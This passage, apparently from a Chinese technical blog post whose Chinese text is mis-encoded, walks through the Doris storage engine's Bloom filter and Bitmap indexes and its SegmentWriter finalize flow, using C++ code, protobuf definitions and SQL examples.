<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">template</span> &lt;FieldType field_type&gt;
<span class="hljs-keyword">class</span> <span class="hljs-title class_">BloomFilterIndexWriterImpl</span> : <span class="hljs-keyword">public</span> BloomFilterIndexWriter {
<span class="hljs-keyword">public</span>:
    <span class="hljs-function">Status <span class="hljs-title">add_values</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span>* values, <span class="hljs-type">size_t</span> count)</span> <span class="hljs-keyword">override</span> </span>{
        <span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>* v = (<span class="hljs-type">const</span> CppType*)values;
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; count; ++i) {
            <span class="hljs-keyword">if</span> (_values.<span class="hljs-built_in">find</span>(*v) == _values.<span class="hljs-built_in">end</span>()) {
                <span class="hljs-comment">// è®¡ç®—å“ˆå¸Œå¹¶æ’å…¥ Bloom Filter</span>
                <span class="hljs-keyword">auto</span> hash = BloomFilter::<span class="hljs-built_in">hash</span>(v, <span class="hljs-built_in">sizeof</span>(CppType), _bf_options.strategy);
                _hash_values.<span class="hljs-built_in">insert</span>(hash);
            }
            ++v;
        }
        <span class="hljs-keyword">return</span> Status::<span class="hljs-built_in">OK</span>();
    }
    
    <span class="hljs-function">Status <span class="hljs-title">flush</span><span class="hljs-params">()</span> <span class="hljs-keyword">override</span> </span>{
        <span class="hljs-comment">// åˆ›å»º Bloom Filter</span>
        std::unique_ptr&lt;BloomFilter&gt; bf;
        <span class="hljs-built_in">RETURN_IF_ERROR</span>(BloomFilter::<span class="hljs-built_in">create</span>(BLOCK_BLOOM_FILTER, &amp;bf));
        <span class="hljs-built_in">RETURN_IF_ERROR</span>(bf-&gt;<span class="hljs-built_in">init</span>(_values.<span class="hljs-built_in">size</span>(), _bf_options.fpp, _bf_options.strategy));
        
        <span class="hljs-comment">// æ·»åŠ æ‰€æœ‰å€¼</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; v : _values) {
            bf-&gt;<span class="hljs-built_in">add_bytes</span>((<span class="hljs-type">char</span>*)&amp;v, <span class="hljs-built_in">sizeof</span>(CppType));
        }
        bf-&gt;<span class="hljs-built_in">set_has_null</span>(_has_null);
        
        <span class="hljs-comment">// ä¿å­˜ Bloom Filter</span>
        _bfs.<span class="hljs-built_in">push_back</span>(std::<span class="hljs-built_in">move</span>(bf));
        _values.<span class="hljs-built_in">clear</span>();
        <span class="hljs-keyword">return</span> Status::<span class="hljs-built_in">OK</span>();
    }
    
    <span class="hljs-function">Status <span class="hljs-title">finish</span><span class="hljs-params">(io::FileWriter* file_writer, ColumnIndexMetaPB* index_meta)</span> <span class="hljs-keyword">override</span> </span>{
        <span class="hljs-comment">// å†™å…¥æ‰€æœ‰ Bloom Filters åˆ° IndexedColumn</span>
        <span class="hljs-function">IndexedColumnWriter <span class="hljs-title">bf_writer</span><span class="hljs-params">(options, bf_type_info, file_writer)</span></span>;
        <span class="hljs-built_in">RETURN_IF_ERROR</span>(bf_writer.<span class="hljs-built_in">init</span>());
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; bf : _bfs) {
            <span class="hljs-function">Slice <span class="hljs-title">data</span><span class="hljs-params">(bf-&gt;data(), bf-&gt;size())</span></span>;
            <span class="hljs-built_in">RETURN_IF_ERROR</span>(bf_writer.<span class="hljs-built_in">add</span>(&amp;data));
        }
        <span class="hljs-built_in">RETURN_IF_ERROR</span>(bf_writer.<span class="hljs-built_in">finish</span>(index_meta-&gt;<span class="hljs-built_in">mutable_bloom_filter</span>()));
        <span class="hljs-keyword">return</span> Status::<span class="hljs-built_in">OK</span>();
    }
    
<span class="hljs-keyword">private</span>:
    ValueDict _values;  <span class="hljs-comment">// å½“å‰ Page çš„å”¯ä¸€å€¼é›†åˆ</span>
    std::set&lt;<span class="hljs-type">uint64_t</span>&gt; _hash_values;  <span class="hljs-comment">// å­—ç¬¦ä¸²ç±»å‹çš„å“ˆå¸Œå€¼é›†åˆ</span>
    std::vector&lt;std::unique_ptr&lt;BloomFilter&gt;&gt; _bfs;  <span class="hljs-comment">// Bloom Filter åˆ—è¡¨</span>
};
</code></pre>
<h4 data-id="heading-48">æŸ¥è¯¢ä½¿ç”¨</h4>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// æŸ¥è¯¢æ—¶ä½¿ç”¨ Bloom Filter è¿‡æ»¤</span>
<span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">BloomFilterIndexReader::could_present</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span>* value)</span> </span>{
    <span class="hljs-comment">// 1. è®¡ç®—å“ˆå¸Œ</span>
    <span class="hljs-type">uint64_t</span> hash = BloomFilter::<span class="hljs-built_in">hash</span>(value, <span class="hljs-built_in">sizeof</span>(value), _hash_strategy);
    
    <span class="hljs-comment">// 2. æ£€æŸ¥ Bloom Filter</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; bf : _bloom_filters) {
        <span class="hljs-keyword">if</span> (bf-&gt;<span class="hljs-built_in">test_bytes</span>((<span class="hljs-type">char</span>*)&amp;hash, <span class="hljs-built_in">sizeof</span>(hash))) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;  <span class="hljs-comment">// å¯èƒ½å­˜åœ¨</span>
        }
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  <span class="hljs-comment">// ä¸€å®šä¸å­˜åœ¨</span>
}

<span class="hljs-comment">// åœ¨ SegmentIterator ä¸­åº”ç”¨</span>
Status SegmentIterator::_apply_bloom_filter(<span class="hljs-type">const</span> ColumnPredicate* predicate) {
    <span class="hljs-keyword">if</span> (predicate-&gt;<span class="hljs-built_in">type</span>() == PredicateType::EQ) {
        <span class="hljs-keyword">auto</span>* eq_pred = <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">const</span> EqualPredicate*&gt;(predicate);
        <span class="hljs-keyword">if</span> (!_bloom_filter_reader-&gt;<span class="hljs-built_in">could_present</span>(eq_pred-&gt;<span class="hljs-built_in">value</span>())) {
            <span class="hljs-comment">// å€¼ä¸€å®šä¸å­˜åœ¨ï¼Œè·³è¿‡æ•´ä¸ª Segment</span>
            <span class="hljs-keyword">return</span> Status::<span class="hljs-built_in">EndOfFile</span>(<span class="hljs-string">"Filtered by Bloom Filter"</span>);
        }
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (predicate-&gt;<span class="hljs-built_in">type</span>() == PredicateType::IN) {
        <span class="hljs-keyword">auto</span>* in_pred = <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">const</span> InListPredicate*&gt;(predicate);
        <span class="hljs-type">bool</span> has_candidate = <span class="hljs-literal">false</span>;
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; value : in_pred-&gt;<span class="hljs-built_in">values</span>()) {
            <span class="hljs-keyword">if</span> (_bloom_filter_reader-&gt;<span class="hljs-built_in">could_present</span>(value)) {
                has_candidate = <span class="hljs-literal">true</span>;
                <span class="hljs-keyword">break</span>;
            }
        }
        <span class="hljs-keyword">if</span> (!has_candidate) {
            <span class="hljs-keyword">return</span> Status::<span class="hljs-built_in">EndOfFile</span>(<span class="hljs-string">"Filtered by Bloom Filter"</span>);
        }
    }
    <span class="hljs-keyword">return</span> Status::<span class="hljs-built_in">OK</span>();
}
</code></pre>
<h4 data-id="heading-49">é…ç½®å‚æ•°</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- åˆ›å»ºè¡¨æ—¶æŒ‡å®š Bloom Filter</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> users (
    id <span class="hljs-type">BIGINT</span>,
    email <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">100</span>)
) DUPLICATE KEY(id)
PROPERTIES (
    "bloom_filter_columns" <span class="hljs-operator">=</span> "email",  <span class="hljs-comment">-- æŒ‡å®šåˆ—</span>
    "bloom_filter_fpp" <span class="hljs-operator">=</span> "0.05"        <span class="hljs-comment">-- False Positive Rateï¼ˆé»˜è®¤ 0.05ï¼‰</span>
);
</code></pre>
<p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼š</p>
<ul>
<li>ç­‰å€¼æŸ¥è¯¢ï¼š<code>WHERE email = 'user@example.com'</code></li>
<li>IN æŸ¥è¯¢ï¼š<code>WHERE user_id IN (1, 2, 3)</code></li>
<li>é«˜åŸºæ•°åˆ—ï¼ˆå”¯ä¸€å€¼å¤šï¼‰</li>
<li>å­—ç¬¦ä¸²ç±»å‹åˆ—</li>
</ul>
<hr/>
<h3 data-id="heading-50">7.4 Bitmap Indexï¼ˆä½å›¾ç´¢å¼•ï¼‰</h3>
<p><strong>ä½œç”¨</strong>ï¼šå¯¹ä½åŸºæ•°åˆ—ï¼ˆå”¯ä¸€å€¼å°‘ï¼‰å»ºç«‹ä½å›¾ç´¢å¼•ï¼ŒåŠ é€Ÿç­‰å€¼æŸ¥è¯¢å’Œå¤šæ¡ä»¶ç»„åˆæŸ¥è¯¢ã€‚</p>
<p><strong>åŸç†</strong>ï¼šä¸ºæ¯ä¸ªå”¯ä¸€å€¼ç»´æŠ¤ä¸€ä¸ª Bitmapï¼Œæ ‡è®°å“ªäº›è¡ŒåŒ…å«è¯¥å€¼ã€‚</p>
<p><strong>Protobuf å®šä¹‰</strong>ï¼š<a title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target="><code>segment_v2.proto:308-322</code></a></p>
<pre><code class="hljs language-protobuf" lang="protobuf">message BitmapIndexPB {
    enum BitmapType {
        UNKNOWN_BITMAP_TYPE = 0;
        ROARING_BITMAP = 1;  // Roaring Bitmapï¼ˆé«˜åº¦å‹ç¼©ï¼‰
    }
    optional BitmapType bitmap_type = 1 [default=ROARING_BITMAP];
    optional bool has_null = 2;              // æ˜¯å¦åŒ…å« NULL
    optional IndexedColumnMetaPB dict_column = 3;   // å­—å…¸åˆ—ï¼ˆå”¯ä¸€å€¼ï¼‰
    optional IndexedColumnMetaPB bitmap_column = 4; // Bitmap åˆ—
}
</code></pre>
<h4 data-id="heading-51">æ•°æ®ç»“æ„</h4>
<pre><code class="hljs language-sql" lang="sql">Dictionary <span class="hljs-keyword">Column</span>:
<span class="hljs-operator">+</span><span class="hljs-comment">----------+----------+----------+----------+</span>
<span class="hljs-operator">|</span> "Active" <span class="hljs-operator">|</span> "Inactive" <span class="hljs-operator">|</span> "Pending" <span class="hljs-operator">|</span> "Deleted" <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">----------+----------+----------+----------+</span>
     <span class="hljs-operator">^</span>            <span class="hljs-operator">^</span>            <span class="hljs-operator">^</span>            <span class="hljs-operator">^</span>
  code<span class="hljs-operator">=</span><span class="hljs-number">0</span>      code<span class="hljs-operator">=</span><span class="hljs-number">1</span>       code<span class="hljs-operator">=</span><span class="hljs-number">2</span>       code<span class="hljs-operator">=</span><span class="hljs-number">3</span>

Bitmap <span class="hljs-keyword">Column</span>:
<span class="hljs-operator">+</span><span class="hljs-comment">-------------------+-------------------+-------------------+-------------------+</span>
<span class="hljs-operator">|</span> Bitmap <span class="hljs-keyword">for</span> code <span class="hljs-number">0</span> <span class="hljs-operator">|</span> Bitmap <span class="hljs-keyword">for</span> code <span class="hljs-number">1</span> <span class="hljs-operator">|</span> Bitmap <span class="hljs-keyword">for</span> code <span class="hljs-number">2</span> <span class="hljs-operator">|</span> Bitmap <span class="hljs-keyword">for</span> code <span class="hljs-number">3</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> {<span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">10</span>, ...}   <span class="hljs-operator">|</span> {<span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">11</span>, ...}   <span class="hljs-operator">|</span> {<span class="hljs-number">2</span>, <span class="hljs-number">7</span>, <span class="hljs-number">12</span>, ...}   <span class="hljs-operator">|</span> {<span class="hljs-number">3</span>, <span class="hljs-number">8</span>, <span class="hljs-number">13</span>, ...}   <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">-------------------+-------------------+-------------------+-------------------+</span>

<span class="hljs-keyword">NULL</span> Bitmap (optional):
<span class="hljs-operator">+</span><span class="hljs-comment">-------------------+</span>
<span class="hljs-operator">|</span> Bitmap <span class="hljs-keyword">for</span> <span class="hljs-keyword">NULL</span>   <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> {<span class="hljs-number">4</span>, <span class="hljs-number">9</span>, <span class="hljs-number">14</span>, ...}   <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">-------------------+</span>
</code></pre>
<h4 data-id="heading-52">å†™å…¥å®ç°</h4>
<p><strong>ä»£ç ä½ç½®</strong>ï¼š<code>be/src/olap/rowset/segment_v2/bitmap_index_writer.cpp</code></p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">template</span> &lt;FieldType field_type&gt;
<span class="hljs-keyword">class</span> <span class="hljs-title class_">BitmapIndexWriterImpl</span> : <span class="hljs-keyword">public</span> BitmapIndexWriter {
<span class="hljs-keyword">public</span>:
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">add_value</span><span class="hljs-params">(<span class="hljs-type">const</span> CppType&amp; value)</span> </span>{
        <span class="hljs-keyword">auto</span> it = _mem_index.<span class="hljs-built_in">find</span>(value);
        <span class="hljs-keyword">if</span> (it != _mem_index.<span class="hljs-built_in">end</span>()) {
            <span class="hljs-comment">// å·²å­˜åœ¨çš„å€¼ï¼Œæ›´æ–° bitmap</span>
            it-&gt;second.<span class="hljs-built_in">add</span>(_rid);
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// æ–°å€¼ï¼Œæ’å…¥ &lt;å€¼, bitmap&gt; å¯¹</span>
            CppType new_value;
            _type_info-&gt;<span class="hljs-built_in">deep_copy</span>(&amp;new_value, &amp;value, _arena);
            _mem_index.<span class="hljs-built_in">insert</span>({new_value, roaring::Roaring::<span class="hljs-built_in">bitmapOf</span>(<span class="hljs-number">1</span>, _rid)});
        }
        _rid++;
    }
    
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">add_null</span><span class="hljs-params">()</span> </span>{
        _null_bitmap.<span class="hljs-built_in">add</span>(_rid);
        _rid++;
    }
    
    <span class="hljs-function">Status <span class="hljs-title">finish</span><span class="hljs-params">(io::FileWriter* file_writer, ColumnIndexMetaPB* index_meta)</span> <span class="hljs-keyword">override</span> </span>{
        <span class="hljs-keyword">auto</span>* bitmap_index_meta = index_meta-&gt;<span class="hljs-built_in">mutable_bitmap_index</span>();
        
        <span class="hljs-comment">// 1. å†™å…¥å­—å…¸åˆ—ï¼ˆæ‰€æœ‰å”¯ä¸€å€¼ï¼‰</span>
        <span class="hljs-function">IndexedColumnWriter <span class="hljs-title">dict_column_writer</span><span class="hljs-params">(options, _type_info, file_writer)</span></span>;
        <span class="hljs-built_in">RETURN_IF_ERROR</span>(dict_column_writer.<span class="hljs-built_in">init</span>());
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> <span class="hljs-type">const</span>&amp; it : _mem_index) {
            <span class="hljs-built_in">RETURN_IF_ERROR</span>(dict_column_writer.<span class="hljs-built_in">add</span>(&amp;(it.first)));
        }
        <span class="hljs-built_in">RETURN_IF_ERROR</span>(dict_column_writer.<span class="hljs-built_in">finish</span>(bitmap_index_meta-&gt;<span class="hljs-built_in">mutable_dict_column</span>()));
        
        <span class="hljs-comment">// 2. å†™å…¥ Bitmap åˆ—</span>
        std::vector&lt;roaring::Roaring*&gt; bitmaps;
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; it : _mem_index) {
            bitmaps.<span class="hljs-built_in">push_back</span>(&amp;(it.second));
        }
        <span class="hljs-keyword">if</span> (!_null_bitmap.<span class="hljs-built_in">isEmpty</span>()) {
            bitmaps.<span class="hljs-built_in">push_back</span>(&amp;_null_bitmap);
            bitmap_index_meta-&gt;<span class="hljs-built_in">set_has_null</span>(<span class="hljs-literal">true</span>);
        }
        
        <span class="hljs-comment">// è®¡ç®—æ¯ä¸ª Bitmap çš„åºåˆ—åŒ–å¤§å°</span>
        std::vector&lt;<span class="hljs-type">size_t</span>&gt; bitmap_sizes;
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>* bitmap : bitmaps) {
            bitmap-&gt;<span class="hljs-built_in">runOptimize</span>();  <span class="hljs-comment">// ä¼˜åŒ– Bitmap</span>
            bitmap_sizes.<span class="hljs-built_in">push_back</span>(bitmap-&gt;<span class="hljs-built_in">getSizeInBytes</span>(<span class="hljs-literal">false</span>));
        }
        
        <span class="hljs-comment">// åºåˆ—åŒ– Bitmaps</span>
        <span class="hljs-function">IndexedColumnWriter <span class="hljs-title">bitmap_column_writer</span><span class="hljs-params">(options, bitmap_type_info, file_writer)</span></span>;
        <span class="hljs-built_in">RETURN_IF_ERROR</span>(bitmap_column_writer.<span class="hljs-built_in">init</span>());
        faststring buf;
        <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; bitmaps.<span class="hljs-built_in">size</span>(); ++i) {
            buf.<span class="hljs-built_in">resize</span>(bitmap_sizes[i]);
            bitmaps[i]-&gt;<span class="hljs-built_in">write</span>(<span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">char</span>*&gt;(buf.<span class="hljs-built_in">data</span>()), <span class="hljs-literal">false</span>);
            <span class="hljs-function">Slice <span class="hljs-title">buf_slice</span><span class="hljs-params">(buf.data(), bitmap_sizes[i])</span></span>;
            <span class="hljs-built_in">RETURN_IF_ERROR</span>(bitmap_column_writer.<span class="hljs-built_in">add</span>(&amp;buf_slice));
        }
        <span class="hljs-built_in">RETURN_IF_ERROR</span>(bitmap_column_writer.<span class="hljs-built_in">finish</span>(bitmap_index_meta-&gt;<span class="hljs-built_in">mutable_bitmap_column</span>()));
        
        <span class="hljs-keyword">return</span> Status::<span class="hljs-built_in">OK</span>();
    }
    
<span class="hljs-keyword">private</span>:
    <span class="hljs-keyword">using</span> MemoryIndexType = std::map&lt;CppType, roaring::Roaring&gt;;
    MemoryIndexType _mem_index;  <span class="hljs-comment">// unique value -&gt; bitmap</span>
    roaring::Roaring _null_bitmap;
    <span class="hljs-type">rowid_t</span> _rid = <span class="hljs-number">0</span>;
};
</code></pre>
<h4 data-id="heading-53">æŸ¥è¯¢ä½¿ç”¨</h4>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// ç­‰å€¼æŸ¥è¯¢ï¼šWHERE status = 'Active'</span>
<span class="hljs-function">Status <span class="hljs-title">BitmapIndexReader::seek</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span>* value, roaring::Roaring* result)</span> </span>{
    <span class="hljs-comment">// 1. åœ¨å­—å…¸ä¸­æŸ¥æ‰¾ code</span>
    <span class="hljs-type">uint32_t</span> code;
    <span class="hljs-type">bool</span> found = _dict_column_reader-&gt;<span class="hljs-built_in">seek_at_or_after</span>(value, &amp;code);
    <span class="hljs-keyword">if</span> (!found) {
        *result = roaring::<span class="hljs-built_in">Roaring</span>();  <span class="hljs-comment">// ç©º Bitmap</span>
        <span class="hljs-keyword">return</span> Status::<span class="hljs-built_in">OK</span>();
    }
    
    <span class="hljs-comment">// 2. è¯»å–å¯¹åº”çš„ Bitmap</span>
    Slice bitmap_slice;
    <span class="hljs-built_in">RETURN_IF_ERROR</span>(_bitmap_column_reader-&gt;<span class="hljs-built_in">read_at_ordinal</span>(code, &amp;bitmap_slice));
    *result = roaring::Roaring::<span class="hljs-built_in">read</span>(bitmap_slice.data, <span class="hljs-literal">false</span>);
    <span class="hljs-keyword">return</span> Status::<span class="hljs-built_in">OK</span>();
}

<span class="hljs-comment">// IN æŸ¥è¯¢ï¼šWHERE status IN ('Active', 'Pending')</span>
<span class="hljs-function">Status <span class="hljs-title">BitmapIndexReader::seek_many</span><span class="hljs-params">(<span class="hljs-type">const</span> std::vector&lt;<span class="hljs-type">const</span> <span class="hljs-type">void</span>*&gt;&amp; values, 
                                    roaring::Roaring* result)</span> </span>{
    *result = roaring::<span class="hljs-built_in">Roaring</span>();
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>* value : values) {
        roaring::Roaring bitmap;
        <span class="hljs-built_in">RETURN_IF_ERROR</span>(<span class="hljs-built_in">seek</span>(value, &amp;bitmap));
        *result |= bitmap;  <span class="hljs-comment">// Bitmap OR</span>
    }
    <span class="hljs-keyword">return</span> Status::<span class="hljs-built_in">OK</span>();
}

<span class="hljs-comment">// å¤šæ¡ä»¶æŸ¥è¯¢ï¼šWHERE status = 'Active' AND gender = 'Female'</span>
roaring::Roaring bitmap_status, bitmap_gender;
status_index-&gt;<span class="hljs-built_in">seek</span>(<span class="hljs-string">"Active"</span>, &amp;bitmap_status);
gender_index-&gt;<span class="hljs-built_in">seek</span>(<span class="hljs-string">"Female"</span>, &amp;bitmap_gender);
roaring::Roaring result = bitmap_status &amp; bitmap_gender;  <span class="hljs-comment">// Bitmap AND</span>
</code></pre>
<h4 data-id="heading-54">é…ç½®</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- åˆ›å»ºè¡¨æ—¶æŒ‡å®š Bitmap Index</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> orders (
    order_id <span class="hljs-type">BIGINT</span>,
    status <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">20</span>),
    payment_method <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">50</span>)
) DUPLICATE KEY(order_id)
PROPERTIES (
    "bitmap_index_columns" <span class="hljs-operator">=</span> "status,payment_method"
);
</code></pre>
<p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼š</p>
<ul>
<li>ä½åŸºæ•°åˆ—ï¼ˆå”¯ä¸€å€¼æ•°é‡ &lt; 10000ï¼‰</li>
<li>ç­‰å€¼æŸ¥è¯¢ï¼š<code>WHERE status = 'Active'</code></li>
<li>IN æŸ¥è¯¢ï¼š<code>WHERE status IN ('Active', 'Pending')</code></li>
<li>å¤šæ¡ä»¶ç»„åˆï¼š<code>WHERE status = 'Active' AND payment_method = 'Credit Card'</code></li>
<li>å…¸å‹åˆ—ï¼šçŠ¶æ€ã€æ€§åˆ«ã€åœ°åŒºã€ç±»ç›®</li>
</ul>
<p><strong>ä¸é€‚ç”¨åœºæ™¯</strong>ï¼š</p>
<ul>
<li>é«˜åŸºæ•°åˆ—ï¼ˆå”¯ä¸€å€¼å¤šï¼Œå¦‚ IDã€Emailï¼‰</li>
<li>èŒƒå›´æŸ¥è¯¢ï¼ˆç”¨ Zone Map æ›´å¥½ï¼‰</li>
</ul>
<hr/>
<h3 data-id="heading-55">7.5 ç´¢å¼•å¯¹æ¯”æ€»ç»“</h3>















































<table><thead><tr><th>ç´¢å¼•ç±»å‹</th><th>ä½œç”¨</th><th>é€‚ç”¨åœºæ™¯</th><th>æŸ¥è¯¢ç±»å‹</th><th>ç©ºé—´å¼€é”€</th></tr></thead><tbody><tr><td><strong>Ordinal Index</strong></td><td>è¡Œå· â†’ Page æ˜ å°„</td><td>æ‰€æœ‰åˆ—</td><td>è¡Œå·å®šä½</td><td>æå°</td></tr><tr><td><strong>Zone Map</strong></td><td>Min/Max è¿‡æ»¤</td><td>æ‰€æœ‰åˆ—</td><td>èŒƒå›´æŸ¥è¯¢</td><td>å°</td></tr><tr><td><strong>Bloom Filter</strong></td><td>å€¼å­˜åœ¨æ€§åˆ¤æ–­</td><td>é«˜åŸºæ•°åˆ—</td><td>ç­‰å€¼ã€IN</td><td>ä¸­</td></tr><tr><td><strong>Bitmap Index</strong></td><td>å€¼ â†’ è¡Œå·æ˜ å°„</td><td>ä½åŸºæ•°åˆ—</td><td>ç­‰å€¼ã€INã€å¤šæ¡ä»¶</td><td>å¤§</td></tr><tr><td><strong>Inverted Index</strong></td><td>å…¨æ–‡æ£€ç´¢</td><td>æ–‡æœ¬åˆ—</td><td>MATCH</td><td>å¤§</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-56">8. SegmentWriter å®Œæ•´æµç¨‹</h2>
<h3 data-id="heading-57">8.1 SegmentWriter ç±»å®šä¹‰</h3>
<p><strong>ä»£ç ä½ç½®</strong>ï¼š<a title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target="><code>segment_writer.h:83-266</code></a></p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SegmentWriter</span> {
<span class="hljs-keyword">public</span>:
    <span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">SegmentWriter</span><span class="hljs-params">(io::FileWriter* file_writer, <span class="hljs-type">uint32_t</span> segment_id,
                           TabletSchemaSPtr tablet_schema, BaseTabletSPtr tablet, 
                           DataDir* data_dir, <span class="hljs-type">const</span> SegmentWriterOptions&amp; opts, 
                           IndexFileWriter* inverted_file_writer)</span></span>;
    
    <span class="hljs-function">Status <span class="hljs-title">init</span><span class="hljs-params">()</span></span>;
    
    <span class="hljs-comment">// å†™å…¥æ•°æ®</span>
    <span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> RowType&gt;
    <span class="hljs-function">Status <span class="hljs-title">append_row</span><span class="hljs-params">(<span class="hljs-type">const</span> RowType&amp; row)</span></span>;
    <span class="hljs-function">Status <span class="hljs-title">append_block</span><span class="hljs-params">(<span class="hljs-type">const</span> vectorized::Block* block, <span class="hljs-type">size_t</span> row_pos, <span class="hljs-type">size_t</span> num_rows)</span></span>;
    
    <span class="hljs-comment">// å®Œæˆå†™å…¥</span>
    <span class="hljs-function">Status <span class="hljs-title">finalize</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span>* segment_file_size, <span class="hljs-type">uint64_t</span>* index_size)</span></span>;
    
<span class="hljs-keyword">private</span>:
    <span class="hljs-comment">// å†™å…¥å„ä¸ªéƒ¨åˆ†</span>
    Status _write_data();                  <span class="hljs-comment">// å†™å…¥æ•°æ® Pages</span>
    Status _write_ordinal_index();         <span class="hljs-comment">// å†™å…¥ Ordinal Index</span>
    Status _write_zone_map();              <span class="hljs-comment">// å†™å…¥ Zone Map</span>
    Status _write_bitmap_index();          <span class="hljs-comment">// å†™å…¥ Bitmap Index</span>
    Status _write_inverted_index();        <span class="hljs-comment">// å†™å…¥å€’æ’ç´¢å¼•</span>
    Status _write_bloom_filter_index();    <span class="hljs-comment">// å†™å…¥ Bloom Filter</span>
    Status _write_short_key_index();       <span class="hljs-comment">// å†™å…¥çŸ­é”®ç´¢å¼•</span>
    Status _write_primary_key_index();     <span class="hljs-comment">// å†™å…¥ä¸»é”®ç´¢å¼•</span>
    Status _write_footer();                <span class="hljs-comment">// å†™å…¥ Footer</span>
    
<span class="hljs-keyword">private</span>:
    <span class="hljs-type">uint32_t</span> _segment_id;
    TabletSchemaSPtr _tablet_schema;
    SegmentWriterOptions _opts;
    
    io::FileWriter* _file_writer;
    IndexFileWriter* _index_file_writer;
    
    SegmentFooterPB _footer;
    std::vector&lt;std::unique_ptr&lt;ColumnWriter&gt;&gt; _column_writers;
    std::unique_ptr&lt;ShortKeyIndexBuilder&gt; _short_key_index_builder;
    std::unique_ptr&lt;PrimaryKeyIndexBuilder&gt; _primary_key_index_builder;
};
</code></pre>
<h3 data-id="heading-58">8.2 å†™å…¥æµç¨‹</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function">Status <span class="hljs-title">SegmentWriter::finalize</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span>* segment_file_size, <span class="hljs-type">uint64_t</span>* index_size)</span> </span>{
    <span class="hljs-comment">// 1. å®Œæˆæ‰€æœ‰åˆ—çš„æ•°æ®å†™å…¥</span>
    <span class="hljs-built_in">RETURN_IF_ERROR</span>(<span class="hljs-built_in">finalize_columns_data</span>());
    
    <span class="hljs-comment">// 2. å†™å…¥ç´¢å¼•</span>
    <span class="hljs-built_in">RETURN_IF_ERROR</span>(<span class="hljs-built_in">finalize_columns_index</span>(index_size));
    
    <span class="hljs-comment">// 3. å†™å…¥ Footer</span>
    <span class="hljs-built_in">RETURN_IF_ERROR</span>(<span class="hljs-built_in">finalize_footer</span>(segment_file_size));
    
    <span class="hljs-keyword">return</span> Status::<span class="hljs-built_in">OK</span>();
}

<span class="hljs-function">Status <span class="hljs-title">SegmentWriter::finalize_columns_data</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-comment">// å®Œæˆæ‰€æœ‰åˆ—çš„æ•°æ®å†™å…¥</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; column_writer : _column_writers) {
        <span class="hljs-built_in">RETURN_IF_ERROR</span>(column_writer-&gt;<span class="hljs-built_in">finish</span>());
    }
    
    <span class="hljs-comment">// å†™å…¥æ•°æ® Pages</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; column_writer : _column_writers) {
        <span class="hljs-built_in">RETURN_IF_ERROR</span>(column_writer-&gt;<span class="hljs-built_in">write_data</span>());
    }
    
    <span class="hljs-keyword">return</span> Status::<span class="hljs-built_in">OK</span>();
}

<span class="hljs-function">Status <span class="hljs-title">SegmentWriter::finalize_columns_index</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span>* index_size)</span> </span>{
    <span class="hljs-type">uint64_t</span> start_offset = _file_writer-&gt;<span class="hljs-built_in">bytes_appended</span>();
    
